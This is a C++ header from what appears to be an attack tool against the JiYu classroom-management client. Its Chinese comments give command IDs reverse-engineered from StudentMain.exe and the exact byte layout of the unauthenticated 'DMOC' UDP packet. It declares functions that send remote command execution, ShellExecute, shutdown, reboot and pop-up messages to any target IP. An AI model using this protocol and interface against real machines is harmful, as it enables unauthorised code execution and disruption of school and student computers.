// udp.h
// UDP 攻击：DMOC 命令协议
#pragma once
#include <string>
#include <vector>
#include <cstdint>

namespace jiyu {

// 命令 ID（逆向自 StudentMain.exe _ProcessRemoteCommand 跳转表 @0x46999c）
enum CommandId : uint32_t {
    CMD_MESSAGE      = 0x06,  // 发消息 / 弹通知窗
    CMD_EXEC_COMMAND = 0x0f,  // 远程执行命令（RS_ExecuteCommandEx）
    CMD_REBOOT        = 0x13,  // 远程重启
    CMD_SHUTDOWN      = 0x14,  // 远程关机
    CMD_SHELL_OPEN    = 0x18,  // ShellExecute 打开
};

// 发送一个 DMOC 命令报文。
// 报文格式（逆向自 LibBaseTrans.dll SendCommand / CCommandPacketHandler::ProcessPacket）：
//   [0]  "DMOC"(0x434F4D44)  [4] 0x00010000  [8] payload+13
//   [0x0c] 16B GUID(任意)     [0x1c] 20000(0x4E20)
//   [0x20] 命令ID             [0x24] payload长度  [0x28] payload
//   总长度 = payload + 41
// 返回 true 表示 UDP 发送成功（不保证接收端执行）。
bool SendDmocCommand(const std::string& targetIp, uint16_t port,
                     uint32_t cmdId, const std::vector<uint8_t>& payload);

// 便捷接口
bool SendShutdown(const std::string& ip, uint16_t port, uint32_t delaySeconds, const std::wstring& msg);
bool SendReboot(const std::string& ip, uint16_t port, uint32_t delaySeconds, const std::wstring& msg);
bool SendTextMessage(const std::string& ip, uint16_t port, const std::wstring& text);
bool SendExecCommand(const std::string& ip, uint16_t port, const std::wstring& cmdLine);

} // namespace jiyu
